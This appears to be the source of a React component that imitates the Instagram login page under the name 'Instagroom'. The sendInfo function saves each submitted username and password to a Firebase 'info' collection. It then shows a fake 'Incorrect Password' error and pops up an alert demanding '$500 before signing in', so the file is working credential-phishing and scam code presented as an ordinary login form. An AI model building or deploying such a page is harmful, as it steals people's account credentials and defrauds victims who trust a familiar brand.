import React, { useState } from 'react';
import db from './firebase'
import './Form.css'

const Form = () => {

  const [username, setUsername] = useState("");
  const [error, setError] = useState(false)
  const [password, setPassword] = useState("");




  const sendInfo = (e) => {
    e.preventDefault();    
    db.collection('info').add({
      username: username,
      password: password
    })
    setError(true);
    setTimeout(() => {
      setError(false)
      setUsername("")
      setPassword("")
      alert("Make sure to send the $500 before signing in")
    }, 2000)
  }

  return(
    <div id="wrapper">
    <div className="container">
      <div className="phone-app-demo"></div>
      <div className="form-data">
        <form>
          <div className="logo">
            <h1>Instagroom</h1>
          </div>
          <input type="text" placeholder="Phone number, username, or email" value={username} onChange={e => setUsername(e.target.value)} required/>
          <input type="text" placeholder="Password"  value={password} onChange={e => setPassword(e.target.value)} required/>
          <button type="submit" className="form-btn" onClick={sendInfo} >Log in</button>
          {error && <p style={{color: "red", fontSize:14, margin: 5}}>Incorrect Password</p>}
          <span className="has-separator">Or</span>
          <a className="facebook-login" href="#">
            <i className="fab fa-facebook-square"></i> Log in with Facebook
          </a>
          <a className="password-reset">Forgot password?</a>
        </form>
        <div className="sign-up">
          Don't have an account? <a>Sign up</a>
        </div>
        <div className="get-the-app">
          <span>Get the app.</span>
          <div className="badges">
            <img src={require('./images/app-store.png')} alt="app-store badge"/>
            <img src={require('./images/google-play.png')} alt="google-play badge"/>
          </div>
        </div>
      </div>
    </div>
  </div>
  )
};

export default Form;
  
